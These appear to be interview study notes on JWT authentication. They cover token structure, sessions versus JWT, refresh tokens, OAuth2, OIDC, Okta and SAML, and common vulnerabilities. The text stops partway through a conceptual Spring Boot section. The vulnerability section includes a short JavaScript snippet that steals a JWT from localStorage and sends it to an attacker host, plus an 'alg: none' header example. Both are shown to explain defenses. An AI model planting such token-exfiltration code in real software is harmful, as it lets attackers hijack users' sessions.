# JWT Token Authentication - Complete Interview Notes

## Table of Contents
1. [What is JWT?](#what-is-jwt)
2. [JWT Structure in Detail](#jwt-structure-in-detail)
3. [How JWT Authentication Works](#how-jwt-authentication-works)
4. [Previous Authentication: Session-Based Authentication](#previous-authentication-session-based-authentication)
5. [JWT vs Session Authentication](#jwt-vs-session-authentication)
6. [Why JWT is Better than Session Authentication](#why-jwt-is-better-than-session-authentication)
7. [JWT Security: Access Tokens and Refresh Tokens](#jwt-security-access-tokens-and-refresh-tokens)
8. [OAuth2, OpenID Connect, and Okta Authentication](#oauth2-openid-connect-and-okta-authentication)
9. [JWT vs OAuth2 vs OpenID Connect vs SAML](#jwt-vs-oauth2-vs-openid-connect-vs-saml)
10. [JWT Security Concerns and Vulnerabilities](#jwt-security-concerns-and-vulnerabilities)
11. [Integrating JWT in Spring Boot - Conceptual Steps](#integrating-jwt-in-spring-boot-conceptual-steps)

---

## What is JWT?

**JSON Web Token (JWT)** is a compact, URL-safe means of representing claims to be transferred between two parties. It is a **stateless authentication mechanism** used to securely transmit information as a JSON object.

### Key Characteristics
- **Self-contained**: JWT contains all necessary information about the user within the token itself
- **Stateless**: Server doesn't need to maintain session information
- **Compact**: Small size makes it efficient for transmission
- **Signed**: Uses cryptographic signatures to ensure data integrity
- **URL-safe**: Can be easily transmitted in URLs, HTTP headers, or cookies

### Primary Use Cases
- Authentication and authorization in web applications
- Single Sign-On (SSO) across multiple applications
- Secure information exchange between parties
- Stateless API authentication
- Mobile and distributed applications

---

## JWT Structure in Detail

A JWT consists of **three parts** separated by dots (`.`):

```
header.payload.signature
```

### Example JWT
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

### 1. Header
The header typically consists of two parts:
- **typ**: Token type (JWT)
- **alg**: Signing algorithm (e.g., HMAC SHA256, RSA)

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

The header is **Base64Url encoded** to form the first part of the JWT.

### 2. Payload (Claims)
The payload contains the **claims** - statements about an entity (user) and additional metadata. There are three types of claims:

#### a) Registered Claims (Standard, Optional but Recommended)
- **iss** (issuer): Who issued the token
- **exp** (expiration time): When the token expires
- **sub** (subject): Subject of the token (usually user ID)
- **aud** (audience): Intended recipient of the token
- **iat** (issued at): When the token was issued
- **nbf** (not before): Token not valid before this time
- **jti** (JWT ID): Unique identifier for the token

#### b) Public Claims
Claims defined in the IANA JWT Registry or publicly defined

#### c) Private/Custom Claims
Custom claims created to share information between parties
- username
- email
- roles
- permissions

```json
{
  "sub": "1234567890",
  "name": "John Doe",
  "email": "john@example.com",
  "role": "admin",
  "iat": 1516239022,
  "exp": 1516242622
}
```

The payload is **Base64Url encoded** to form the second part of the JWT.

**Important**: The payload is encoded, NOT encrypted. Anyone can decode and read it. Never put sensitive information like passwords in the payload.

### 3. Signature
The signature ensures that the token hasn't been tampered with. It is created by:

1. Taking the encoded header
2. Taking the encoded payload
3. Concatenating them with a dot (`.`)
4. Signing this string using the algorithm specified in the header and a **secret key**

```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)
```

The signature is **Base64Url encoded** to form the third part of the JWT.

**Purpose of Signature**:
- Verifies the sender is who they claim to be
- Ensures the message wasn't changed during transmission
- Only parties with the secret key can create valid signatures

---

## How JWT Authentication Works

### Step-by-Step Flow

#### 1. User Login (Authentication)
- User provides credentials (username and password) via login form
- Client sends these credentials to the authentication server

#### 2. Server Validates Credentials
- Server validates the credentials against the database
- If credentials are correct, server proceeds to generate JWT

#### 3. Token Generation
- Server creates a JWT containing user information in the payload (claims)
- Server signs the JWT using a secret key or private key
- The resulting JWT is a compact string

#### 4. Token Sent to Client
- Server sends the JWT back to the client in the response
- Client stores the JWT for future use

**Storage Options**:
- **LocalStorage**: Simple but vulnerable to XSS attacks
- **SessionStorage**: Cleared when browser tab closes
- **HTTP-only Cookie**: More secure, prevents JavaScript access
- **Memory**: Most secure but lost on page refresh

#### 5. Client Includes Token in Subsequent Requests
When the client wants to access protected resources, it includes the JWT in the request:

```
Authorization: Bearer <JWT_TOKEN>
```

The token is typically sent in the **HTTP Authorization header**.

#### 6. Server Validates Token
For each incoming request:
- Server extracts the JWT from the Authorization header
- Server decodes the JWT
- Server verifies the signature using the secret key
- Server checks token expiration and other claims
- If valid, server processes the request
- If invalid or expired, server returns an error (401 Unauthorized)

#### 7. Server Grants or Denies Access
- If JWT is valid: Server extracts user information from the payload and grants access to the requested resource
- If JWT is invalid or expired: Server denies access and returns an error

#### 8. Token Expiration
- When JWT expires, client must obtain a new JWT
- This can be done by either:
  - Logging in again
  - Using a refresh token to get a new access token (without re-authentication)

### Visual Flow
```
User → Login (credentials) → Server
                              ↓ (validates)
                              ↓ (generates JWT)
User ← JWT ← Server
  ↓ (stores JWT)
  ↓ (makes request with JWT in header)
Server ← Request + JWT
  ↓ (validates JWT)
  ↓ (verifies signature, checks expiration)
User ← Response ← Server
```

---

## Previous Authentication: Session-Based Authentication

Before JWT became popular, **session-based authentication** was the standard approach for maintaining user login state.

### How Session-Based Authentication Works

#### 1. User Login
- User provides credentials (username and password)
- Client sends credentials to the server

#### 2. Server Creates Session
- Server validates credentials against the database
- If valid, server creates a **session object** containing user information
- Server stores this session in **server-side storage** (database, Redis, memory)
- Server generates a unique **session ID** for this session

#### 3. Server Sends Session ID to Client
- Server sends the session ID back to the client
- Session ID is typically stored in a **cookie** on the client's browser
- Cookie is automatically included in every subsequent request to the same domain

```
Set-Cookie: JSESSIONID=6E3487971234567896704A9EB4AE501F; Path=/; HttpOnly
```

#### 4. Client Sends Session ID with Each Request
- Browser automatically includes the session cookie with every request
- No manual intervention needed from the client

#### 5. Server Validates Session ID
For each incoming request:
- Server extracts session ID from the cookie
- Server looks up the session ID in the session store (database/cache)
- Server retrieves the associated user information
- If session is valid and not expired, server grants access
- If session is invalid or expired, server denies access

#### 6. User Logout
- User clicks logout
- Server destroys the session from the session store
- Client deletes the session cookie
- User must log in again to create a new session

### Characteristics of Session-Based Authentication
- **Stateful**: Server maintains session state for every logged-in user
- **Server-side storage required**: Sessions stored in database, Redis, or memory
- **Session ID in cookie**: Client only stores session ID, not user information
- **Easy revocation**: Server can immediately invalidate sessions by deleting from storage
- **Domain-specific**: Cookies typically work within the same domain

---

## JWT vs Session Authentication

### Key Differences

| Aspect | Session-Based Authentication | JWT Authentication |
|--------|------------------------------|-------------------|
| **State Management** | Stateful - server stores session data | Stateless - no server-side storage needed |
| **Storage Location** | Server-side (database, Redis, memory) | Client-side (browser storage, cookie) |
| **What Client Stores** | Only session ID | Entire token with user information |
| **Server Load** | Higher - must query session store for each request | Lower - only validates signature, no database lookup |
| **Scalability** | Limited - each server must access centralized session store | Highly scalable - any server can validate token |
| **Revocation** | Easy - delete session from server | Difficult - can't revoke until token expires |
| **Token Expiration** | Server controls expiration | Token contains expiration time |
| **Cross-Domain Support** | Limited - cookies domain-specific | Good - tokens can be sent to any domain |
| **Size** | Small - only session ID (~32 bytes) | Larger - contains encoded data (~500+ bytes) |
| **Database Lookups** | Required for each request | Not required (unless fetching additional data) |
| **Distributed Systems** | Challenging - shared session store needed | Easy - stateless validation |
| **Security on Logout** | Immediate - session destroyed | Delayed - token valid until expiration |
| **Best For** | Traditional web apps, single server, need immediate revocation | APIs, microservices, mobile apps, distributed systems |

### Detailed Comparison

#### Scalability
- **Session**: When scaling horizontally (multiple servers), all servers must access the same session store. This creates a bottleneck and single point of failure. Solutions like sticky sessions or Redis help but add complexity.
- **JWT**: Any server can validate the token independently using the secret key. No shared storage needed. Perfect for distributed systems and microservices.

#### Performance
- **Session**: Each request requires a database/cache lookup to retrieve session data. This adds latency, especially with geographically distributed services.
- **JWT**: Validation is purely computational (signature verification). No network calls to external storage. Faster for high-traffic applications.

#### Security
- **Session**: More secure for logout and revocation. Server has full control. If session is deleted, user is immediately logged out. Less vulnerable to XSS if using HTTP-only cookies.
- **JWT**: Harder to revoke. Once issued, valid until expiration. If stolen, attacker can use until expiry. Storing in localStorage makes it vulnerable to XSS attacks.

#### Implementation Complexity
- **Session**: Simpler to implement. Most frameworks have built-in session management. Easy to understand and debug.
- **JWT**: Requires careful implementation. Must handle token generation, validation, refresh tokens, and security properly. More moving parts.

#### Use Cases
**Session-Based Best For**:
- Traditional web applications with server-side rendering
- Applications requiring immediate session termination
- Single-server or small-scale applications
- Applications where user session data changes frequently
- Banking and financial applications (real-time control needed)

**JWT Best For**:
- RESTful APIs (stateless by nature)
- Single Sign-On (SSO) across multiple applications
- Mobile applications
- Microservices architectures
- Distributed systems with multiple servers
- Cross-domain authentication
- Applications prioritizing scalability over immediate revocation

---

## Why JWT is Better than Session Authentication

While "better" depends on the use case, JWT offers several advantages over session authentication for modern applications:

### 1. Stateless Nature (Scalability)
**Problem with Sessions**: As your application scales horizontally (adding more servers), all servers need access to the same session store. This creates:
- Bottleneck in the session store
- Single point of failure
- Complex infrastructure (Redis clusters, sticky sessions)
- Increased latency due to network calls

**JWT Solution**: Each server can independently validate JWT using just the secret key. No shared storage, no bottleneck, infinite horizontal scaling.

**Example**: An API with 100 servers can each validate JWTs independently. With sessions, all 100 servers would query the same Redis cluster, creating a bottleneck.

### 2. Performance (No Database Lookups)
**Sessions**: Every single request requires:
- Extract session ID from cookie
- Query session store (Redis/database)
- Retrieve user data
- Check expiration
- Process request

**JWT**: Every request requires:
- Extract JWT from header
- Validate signature (cryptographic operation)
- Check expiration (from token itself)
- Process request

**Result**: JWT eliminates network I/O for authentication, significantly reducing latency, especially for distributed systems or high-traffic applications.

### 3. Cross-Domain and Cross-Service Authentication
**Sessions**: Cookies are domain-specific due to browser security. Sharing sessions across domains requires complex workarounds like CORS configuration and subdomain sharing.

**JWT**: Token can be included in any HTTP request to any domain. Perfect for:
- Microservices (service-to-service communication)
- Third-party API integration
- Mobile apps connecting to APIs
- SPAs (Single Page Applications) calling different backends

**Example**: Your frontend at `app.example.com` can send JWT to APIs at `api.example.com`, `analytics.example.com`, and even `partner.different-domain.com`.

### 4. Mobile-Friendly
**Sessions**: Mobile apps don't use browsers, so cookie-based sessions don't work naturally. You'd need to implement custom session handling.

**JWT**: Mobile apps can easily store JWT in secure storage and include it in API requests. Simple and standard approach.

### 5. Flexibility and Portability
**JWT Payload**: Contains user information, roles, permissions, and custom data. The token carries the context needed to make authorization decisions.

**Session**: Only carries session ID. Server must look up all user information for every request.

**Benefit**: With JWT, services can make authorization decisions based solely on the token, without additional database queries.

**Example**: A JWT contains `"role": "admin"`. The API can immediately check if the user is admin without querying the database.

### 6. Decentralized Architecture
**Sessions**: Centralized session store is required. All services must connect to it.

**JWT**: Each microservice can validate tokens independently. True decentralization.

**Example in Microservices**:
- User Service generates JWT after login
- Order Service validates JWT to check user identity
- Payment Service validates JWT to check permissions
- All without querying User Service or a shared database

### 7. Reduced Server Memory and Storage
**Sessions**: Server must maintain session data for every logged-in user. With millions of users, this is expensive (memory/database storage).

**JWT**: Server stores nothing. All data is in the client-held token.

**Result**: Lower infrastructure costs, especially for large-scale applications.

### 8. Works Well with Modern Architecture
JWT aligns perfectly with:
- RESTful APIs (stateless by design)
- Single Page Applications (SPAs)
- Microservices
- Serverless functions (no persistent state)
- API gateways

### 9. Industry Standard
JWT is an open standard (RFC 7519). Wide adoption means:
- Libraries available in all languages
- Well-tested implementations
- Security best practices documented
- Interoperability between different systems

### Limitations of JWT (Important to Know)

Despite the advantages, JWT has drawbacks:

1. **Revocation is Difficult**: Once issued, you can't invalidate a JWT until it expires. Solutions exist (blacklists, short expiry) but add complexity.

2. **Token Size**: JWTs are larger than session IDs (hundreds of bytes vs ~32 bytes). This affects bandwidth, especially for mobile apps.

3. **Security if Stolen**: If a JWT is stolen (XSS, MITM), the attacker can use it until expiry. Sessions can be immediately invalidated.

4. **Payload is Readable**: Anyone can decode and read the JWT payload. Never put sensitive information in it.

5. **No Built-in Refresh Mechanism**: Must implement refresh tokens separately for long-lived sessions.

### When to Use Sessions Over JWT

Use sessions when:
- You need immediate session revocation (banking apps)
- Your app is a traditional monolithic web app (not a distributed system)
- Security is more important than scalability
- User session data changes frequently
- You want simpler implementation

---

## JWT Security: Access Tokens and Refresh Tokens

A major security challenge with JWT is that **once issued, you cannot revoke them until they expire**. If a token is stolen, the attacker can use it until expiration.

### The Problem with Long-Lived Tokens
- **Long expiration**: If JWT expires in 30 days and is stolen, attacker has 30 days of access
- **Short expiration**: If JWT expires in 5 minutes, user must log in every 5 minutes (bad UX)

### Solution: Access Token + Refresh Token Strategy

Modern JWT implementations use **two tokens**:

#### 1. Access Token
- **Purpose**: Used for accessing protected resources (APIs)
- **Lifespan**: Short-lived (5-15 minutes)
- **Storage**: Can be in memory, localStorage, or cookie
- **Contains**: User identity, permissions, expiration
- **Usage**: Sent with every API request

#### 2. Refresh Token
- **Purpose**: Used to obtain new access tokens
- **Lifespan**: Long-lived (days, weeks, or months)
- **Storage**: HTTP-only, secure cookie (safer) or secure database
- **Contains**: User identity, longer expiration
- **Usage**: Only sent to specific refresh endpoint

### How Access + Refresh Token Flow Works

#### Initial Login
1. User logs in with credentials
2. Server validates credentials
3. Server generates **two tokens**:
   - Short-lived access token (15 minutes)
   - Long-lived refresh token (7 days)
4. Server sends both tokens to client
5. Client stores access token (memory/localStorage)
6. Client stores refresh token (HTTP-only cookie or secure storage)

#### Making API Requests
1. Client includes access token in Authorization header
2. Server validates access token
3. If valid, server processes request
4. If expired, server returns 401 Unauthorized

#### When Access Token Expires
1. Client makes request with expired access token
2. Server returns 401 Unauthorized with "token expired" message
3. Client automatically calls the **refresh endpoint** with the refresh token
4. Server validates refresh token
5. If refresh token is valid:
   - Server issues a new access token (and optionally a new refresh token)
   - Client stores new access token
   - Client retries the original request with new access token
6. If refresh token is invalid or expired:
   - Server returns error
   - Client redirects user to login page

#### Refresh Token Rotation (Advanced Security)
For enhanced security, use **refresh token rotation**:
- When refresh token is used to get new access token, the old refresh token is invalidated
- A new refresh token is issued along with the new access token
- This ensures refresh tokens are single-use
- If a refresh token is used twice (reuse detected), it indicates token theft:
  - All refresh tokens for that user are invalidated
  - User is forced to log in again

### Benefits of This Approach

1. **Short-lived access tokens**: Minimize damage if stolen (only 15 minutes of access)
2. **Better user experience**: User doesn't need to log in frequently
3. **Revocation possible**: Server can invalidate refresh tokens in database
4. **Compromise detection**: Refresh token reuse detection catches attacks

### Implementation Notes

**Access Token**:
```json
{
  "user_id": "12345",
  "username": "john_doe",
  "role": "admin",
  "iat": 1698765432,
  "exp": 1698766332  // expires in 15 minutes
}
```

**Refresh Token**:
```json
{
  "user_id": "12345",
  "type": "refresh",
  "iat": 1698765432,
  "exp": 1699370232  // expires in 7 days
}
```

**Storage Best Practices**:
- Access Token: Memory or short-lived sessionStorage (prevents XSS)
- Refresh Token: HTTP-only, Secure, SameSite cookie (prevents XSS and CSRF)

**Refresh Endpoint**:
```
POST /auth/refresh
Cookie: refresh_token=<JWT_REFRESH_TOKEN>

Response:
{
  "access_token": "new_access_token",
  "refresh_token": "new_refresh_token"  // optional, for rotation
}
```

### Token Expiration Best Practices
- **Access Token**: 5-15 minutes for high-security apps, 30-60 minutes for standard apps
- **Refresh Token**: 7-30 days, or until user logs out
- **Critical Apps** (banking): Very short access token (5 min) and require re-authentication frequently
- **Low-Risk Apps**: Longer access tokens (1 hour) acceptable

---

## OAuth2, OpenID Connect, and Okta Authentication

JWT is often used in conjunction with **OAuth2** and **OpenID Connect** protocols. Let's clarify how these work and how services like **Okta** fit in.

### OAuth2: Authorization Framework

**OAuth2** is an **authorization** (not authentication) framework that allows third-party applications to obtain limited access to a user's resources without exposing credentials.

#### Key Concept: Delegation
OAuth2 lets you grant access to your resources without sharing your password.

**Example**: You want to use Trello and give it access to your Google Drive. You don't give Trello your Google password. Instead:
1. Trello redirects you to Google (authorization server)
2. You log into Google and approve Trello's access
3. Google gives Trello an **access token**
4. Trello uses the access token to access your Google Drive on your behalf

#### OAuth2 Roles
- **Resource Owner**: You (the user)
- **Client**: The application (Trello)
- **Resource Server**: The API holding the resources (Google Drive API)
- **Authorization Server**: Issues access tokens (Google OAuth server)

#### OAuth2 Tokens
- **Access Token**: Short-lived token granting access to resources
- **Refresh Token**: Long-lived token to get new access tokens
- **Token Format**: OAuth2 doesn't specify format. It can be JWT or opaque string.

**Important**: OAuth2 is about **authorization** (what you can access), not **authentication** (who you are). It doesn't define how to identify the user.

### OpenID Connect (OIDC): Authentication Layer

**OpenID Connect** is an **authentication** layer built on top of OAuth2. It extends OAuth2 to include identity information.

#### What OIDC Adds to OAuth2
- Standardizes authentication (OAuth2 doesn't)
- Provides an **ID Token** (JWT format) containing user identity
- Defines standard claims for user information
- Enables Single Sign-On (SSO)

#### OIDC Tokens
1. **ID Token** (new in OIDC):
   - Always a JWT
   - Contains user identity information (claims)
   - Examples: user ID, name, email, authentication time
   - Used by the client to identify the user

2. **Access Token** (from OAuth2):
   - Used to access APIs
   - Format not specified (can be JWT or opaque)

3. **Refresh Token** (from OAuth2):
   - Used to get new access and ID tokens

#### OIDC Example
You want to log into Spotify using your Facebook account:
1. Spotify redirects you to Facebook (identity provider)
2. You log into Facebook
3. Facebook asks: "Allow Spotify to access your basic profile?"
4. You approve
5. Facebook sends Spotify:
   - **ID Token** (JWT with your name, email, Facebook ID)
   - **Access Token** (to access Facebook APIs)
6. Spotify uses ID Token to identify you and create your Spotify session
7. Spotify uses Access Token to fetch your Facebook profile picture

**Result**: You're authenticated (Spotify knows who you are via ID Token) and Spotify is authorized to access your Facebook data (via Access Token).

### How Okta Fits In

**Okta** is an **Identity Provider (IdP)** that implements OAuth2 and OpenID Connect standards. It handles authentication and authorization for your applications.

#### What Okta Does
- Acts as the **Authorization Server** (OAuth2 role)
- Acts as the **Identity Provider** (OIDC role)
- Manages user identities and credentials
- Issues access tokens and ID tokens
- Provides Single Sign-On (SSO) across applications
- Handles user management, MFA, password policies

#### How Okta Authentication Works

##### Step 1: User Tries to Access Your Application
- User visits your app
- App redirects user to Okta's login page

##### Step 2: User Authenticates with Okta
- User enters credentials on Okta's hosted login page
- Okta verifies credentials
- Okta may require MFA (multi-factor authentication)

##### Step 3: Okta Issues Tokens
If authentication is successful, Okta generates:
- **ID Token** (JWT): Contains user identity (username, email, user ID)
- **Access Token** (JWT or opaque): Used to access your APIs
- **Refresh Token** (optional): Used to get new tokens

##### Step 4: Okta Redirects User Back to Your App
- Okta redirects user back to your app with an **authorization code**
- Your app exchanges the authorization code for the tokens (backend request)

##### Step 5: Your App Uses Tokens
- Your app validates the ID Token to identify the user
- Your app stores tokens securely
- User is logged into your app

##### Step 6: Accessing Protected Resources
- User makes request to your API
- Your app includes access token in request header
- Your API validates the access token by:
  - Checking signature using Okta's public keys (from `/.well-known/jwks.json`)
  - Verifying issuer, audience, expiration
- If valid, API processes request

#### Okta's Well-Known Endpoints
Okta (and other OIDC providers) expose metadata at:

```
https://your-domain.okta.com/.well-known/openid-configuration
```

This returns:
- **issuer**: URL of the Okta authorization server
- **authorization_endpoint**: Where to redirect users for login
- **token_endpoint**: Where to exchange code for tokens
- **userinfo_endpoint**: Where to get additional user info
- **jwks_uri**: Where to get public keys for JWT validation

**Example**:
```
https://your-domain.okta.com/oauth2/default/v1/keys
```
Returns public keys used to verify JWT signatures.

#### Validating Okta JWT Tokens
Your API validates tokens without calling Okta for each request:

1. Get public keys from Okta's `jwks_uri` (cached)
2. Decode JWT header and payload
3. Verify signature using public key
4. Check token hasn't expired (`exp` claim)
5. Verify issuer matches Okta (`iss` claim)
6. Verify audience matches your app (`aud` claim)

**Important**: Okta uses **asymmetric signing** (RSA):
- Okta signs tokens with **private key** (secret, never shared)
- Your app verifies tokens with **public key** (from jwks_uri)

#### Okta vs Self-Managed JWT

| Aspect | Self-Managed JWT | Okta (or Similar IdP) |
|--------|------------------|----------------------|
| **Token Generation** | Your server generates tokens | Okta generates tokens |
| **User Management** | You manage users in your database | Okta manages users |
| **Login UI** | You build login page | Okta provides hosted login page |
| **Security** | You implement security (hashing, salting, MFA) | Okta handles security |
| **Token Validation** | Your API validates using your secret key | Your API validates using Okta's public keys |
| **Signing** | Symmetric (HMAC) or Asymmetric (RSA) | Asymmetric (RSA) |
| **Complexity** | More control, more responsibility | Less control, easier implementation |
| **SSO** | Must implement yourself | Built-in |
| **Cost** | Development time | Subscription fee |

#### When to Use Okta vs JWT Alone

**Use Okta (or Auth0, Keycloak, AWS Cognito)**:
- You need enterprise SSO
- You want MFA, social login, passwordless
- You don't want to manage user passwords
- You need compliance (SOC2, HIPAA)
- Multiple applications share user base
- You want to delegate authentication to experts

**Use Self-Managed JWT**:
- Simple authentication needs
- Full control over auth flow required
- Budget constraints (no subscription costs)
- Custom authentication logic needed
- Learning or small projects

### SAML vs OAuth2 vs OIDC (Quick Comparison)

These are all related to authentication/authorization but serve different purposes:

| Protocol | Purpose | Primary Use | Format | Age |
|----------|---------|------------|---------|-----|
| **SAML** | Authentication & Authorization | Enterprise SSO | XML | Old (2005) |
| **OAuth2** | Authorization only | API authorization, delegated access | JSON | Modern (2012) |
| **OpenID Connect** | Authentication (built on OAuth2) | User login, SSO | JSON (JWT) | Modern (2014) |

**SAML**: Used mostly in legacy enterprise systems. Complex XML-based protocol. Being phased out in favor of OIDC.

**OAuth2**: For authorization (granting access to resources). Example: "Let this app access my Google Drive."

**OIDC**: For authentication (identifying who you are). Example: "Log in with Google."

**Okta Supports**: OAuth2, OIDC, and SAML (for legacy systems)

---

## JWT vs OAuth2 vs OpenID Connect vs SAML

Let's clarify the relationships and differences once more:

### Nature
- **JWT**: A **token format** (not a protocol)
- **OAuth2**: An **authorization protocol**
- **OpenID Connect**: An **authentication protocol** (extends OAuth2)
- **SAML**: An **authentication and authorization protocol**

### Relationship
- JWT can be used as the token format in OAuth2 and OIDC
- OIDC uses JWT for ID tokens
- OAuth2 access tokens can be JWT or opaque strings
- SAML uses XML assertions (not JWT)

### Purpose
- **JWT**: Securely transmit information as a signed token
- **OAuth2**: Grant third-party access to resources without sharing passwords
- **OIDC**: Authenticate users and provide identity information
- **SAML**: Enterprise SSO and federated authentication

### Token Format
- **JWT**: JSON + Base64 encoding + signature
- **OAuth2**: Not specified (can be JWT, opaque string, etc.)
- **OIDC**: ID token is JWT; access token can be JWT or opaque
- **SAML**: XML assertion

### Example Usage
**JWT**: "I'm storing user ID and role in a signed token for my API."

**OAuth2**: "I want to let Trello access my Google Drive without giving it my password."

**OIDC**: "I want users to log into my app using their Google account."

**SAML**: "Employees log into the corporate portal once, then access all internal apps (HR, email, CRM) without logging in again."

### Can They Work Together?
**Yes!**

**Common Stack**:
- Use **OIDC** for user authentication (login)
- OIDC issues an **ID Token** (JWT format) for user identity
- OIDC issues an **Access Token** (can be JWT) for API access
- Your APIs validate the JWT access token
- You use **refresh tokens** (OAuth2 concept) for long sessions

**Example with Okta**:
1. User logs in via Okta (OIDC)
2. Okta returns ID Token (JWT) and Access Token (JWT)
3. Your app uses ID Token to identify the user
4. Your app sends Access Token to your APIs
5. Your APIs validate JWT Access Token
6. When Access Token expires, use Refresh Token to get new one

---

## JWT Security Concerns and Vulnerabilities

While JWT is powerful, improper implementation leads to vulnerabilities. Understanding these is critical for interviews and secure applications.

### 1. Token Storage Vulnerabilities

#### a) LocalStorage XSS Risk
**Problem**: If JWT is stored in `localStorage`, it's accessible to JavaScript. If your site has an XSS vulnerability (injected malicious script), the attacker can steal the JWT.

```javascript
// Malicious script steals JWT
const token = localStorage.getItem('jwt_token');
fetch('https://attacker.com/steal?token=' + token);
```

**Solution**:
- Store JWT in **HTTP-only cookies** (JavaScript can't access)
- Implement strong Content Security Policy (CSP)
- Sanitize all user inputs to prevent XSS

#### b) CSRF with Cookies
**Problem**: If JWT is stored in a cookie, browsers automatically send it with every request to that domain. Attacker can trick user into making requests (CSRF attack).

**Solution**:
- Use `SameSite=Strict` or `SameSite=Lax` cookie attribute
- Implement CSRF tokens for state-changing operations
- Verify the `Origin` or `Referer` header

#### c) Token Exposure in URLs
**Problem**: Never put JWT in URL query parameters. URLs are logged in browser history, server logs, and referrer headers.

**Bad**: `https://example.com/api/data?token=eyJhbGc...`

**Good**: Send JWT in `Authorization` header

### 2. Weak or Missing Signature Validation

#### a) Algorithm Confusion Attack
**Problem**: JWT header specifies the signing algorithm. If server doesn't properly validate the algorithm, attacker can:
1. Change algorithm from RS256 (asymmetric) to HS256 (symmetric)
2. Sign the token using the public key as the secret
3. Server uses public key to validate, which succeeds

**Example Vulnerable Header**:
```json
{
  "alg": "none",  // No signature!
  "typ": "JWT"
}
```

**Solution**:
- Always explicitly specify and enforce the expected algorithm
- Never accept `alg: none`
- Validate algorithm matches what you expect

#### b) No Signature Verification
**Problem**: Some implementations forget to verify the signature at all.

**Solution**: Always verify the signature before trusting the payload.

### 3. Sensitive Data in Payload

**Problem**: JWT payload is Base64-encoded, not encrypted. Anyone can decode and read it.

**Example**:
```bash
echo "eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0" | base64 -d
# Output: {"sub":"1234567890","name":"John Doe"}
```

**Never put in JWT**:
- Passwords
- Credit card numbers
- Social security numbers
- Private API keys
- Any sensitive personal information

**Safe to include**:
- User ID
- Username
- Email
- Roles
- Permissions
- Non-sensitive metadata

### 4. Token Revocation Challenges

**Problem**: Once issued, JWT cannot be invalidated until expiry. If stolen, attacker can use it.

**Partial Solutions**:
- **Short expiration times**: Minimize window of misuse
- **Refresh token strategy**: Short-lived access tokens
- **Token blacklist**: Maintain list of revoked tokens (defeats stateless benefit)
- **Token versioning**: Include version in payload, increment on logout
- **Use opaque tokens for critical operations**: Can be revoked in database

### 5. Token Expiration Issues

#### a) No Expiration
**Problem**: JWT without `exp` claim never expires. If stolen, attacker has permanent access.

**Solution**: Always include `exp` claim with reasonable value.

#### b) Too Long Expiration
**Problem**: Token expires in 30 days. If stolen, attacker has 30 days of access.

**Solution**: 
- Use short-lived access tokens (5-30 minutes)
- Use refresh tokens for longer sessions

#### c) Not Checking Expiration
**Problem**: Server doesn't validate `exp` claim.

**Solution**: Always check if token is expired before accepting it.

### 6. Weak Secret Keys

**Problem**: Using weak or default secret keys for signing.

**Example Weak Keys**:
- `secret`
- `password123`
- Default keys from tutorials

**Solution**:
- Use strong, randomly generated keys (minimum 256 bits for HS256)
- Store keys securely (environment variables, secret management systems)
- Rotate keys periodically
- Use asymmetric signing (RS256) for distributed systems

### 7. Token Size Issues

**Problem**: JWT can become large if you add many claims. Larger tokens mean:
- More bandwidth consumed
- Slower transmission
- Cookie size limits (cookies max 4KB)

**Solution**:
- Keep payload minimal
- Store large data in database, reference by ID in token
- Use token by reference (opaque token) for very large contexts

### 8. Replay Attacks

**Problem**: Attacker intercepts a valid JWT and reuses it multiple times.

**Partial Solutions**:
- Short expiration times
- Use JTI (JWT ID) claim with nonce
- Implement request rate limiting
- Use HTTPS to prevent interception

### 9. Man-in-the-Middle (MITM) Attacks

**Problem**: Attacker intercepts JWT during transmission over HTTP.

**Solution**:
- **Always use HTTPS** in production
- Implement certificate pinning for mobile apps
- Use secure cookies (`Secure` flag)

### 10. JWT in URL Parameters or GET Requests

**Problem**: JWTs in URLs are logged everywhere (browser history, server logs, proxies).

**Solution**: Always use POST requests or Authorization headers, never GET with token in URL.

### Security Best Practices Summary

1. **Always use HTTPS** in production
2. **Validate signature** before trusting payload
3. **Enforce expected algorithm** (don't trust `alg` header blindly)
4. **Set short expiration** (5-30 minutes for access tokens)
5. **Use refresh tokens** for longer sessions
6. **Store tokens securely**: HTTP-only, Secure, SameSite cookies
7. **Never put sensitive data** in payload
8. **Use strong secret keys** (minimum 256 bits)
9. **Implement proper error handling** (don't leak information in errors)
10. **Validate all claims**: `exp`, `iss`, `aud`
11. **Implement rate limiting** to prevent abuse
12. **Use asymmetric signing (RS256)** for distributed systems
13. **Implement token refresh** and rotation
14. **Consider using opaque tokens** for critical operations requiring revocation
15. **Regular security audits** of authentication code

---

## Integrating JWT in Spring Boot - Conceptual Steps

Here's a high-level, conceptual overview of how to integrate JWT authentication in a Spring Boot application. No code, just the architectural flow and components needed.

### Prerequisites Understanding
- Spring Boot basics
- Spring Security framework
- REST API concepts
- Database for user management

### Architecture Overview

Your Spring Boot application will have several layers:
1. **User Authentication Layer**: Handles login and token generation
2. **JWT Utilities**: Generate and validate tokens
3. **Security Filter**: Intercepts requests and validates JWT
4. **Security Configuration**: Configures Spring Security
5. **Protected Resources**: Your actual API endpoints

### Step 1: Add Dependencies

You need to include dependencies for:
- **Spring Security**: Provides authentication and authorization framework
- **JWT Library**: For creating and validating JWTs (e.g., `jjwt` or `java-jwt`)
- **Spring Web**: For REST controllers
- **Database** (JPA/JDBC): For storing user credentials

**Common JWT Libraries**:
- `io.jsonwebtoken:jjwt` (JJWT)
- `com.auth0:java-jwt` (Auth0)

### Step 2: Create User Entity and Repository

You need to model your users in the database.

**User Entity** should contain:
- User ID
- Username
- Password (hashed with BCrypt)
- Email
- Roles/Authorities (e.g., ROLE_USER, ROLE_ADMIN)
- Other profile information

**User Repository**:
- Interface extending Spring Data JPA repository
- Methods to find users by username or email

### Step 3: Implement UserDetailsService

Spring Security uses `UserDetailsService` to load user information during authentication.

**Your UserDetailsService Implementation**:
- Override `loadUserByUsername(String username)` method
- Query your User Repository to find user by username
- Convert your User entity to Spring Security's `UserDetails` object
- Return UserDetails containing username, password, and authorities

**Purpose**: This is how Spring Security retrieves user credentials for validation.

### Step 4: Create JWT Utility Service

Create a service class to handle JWT operations.

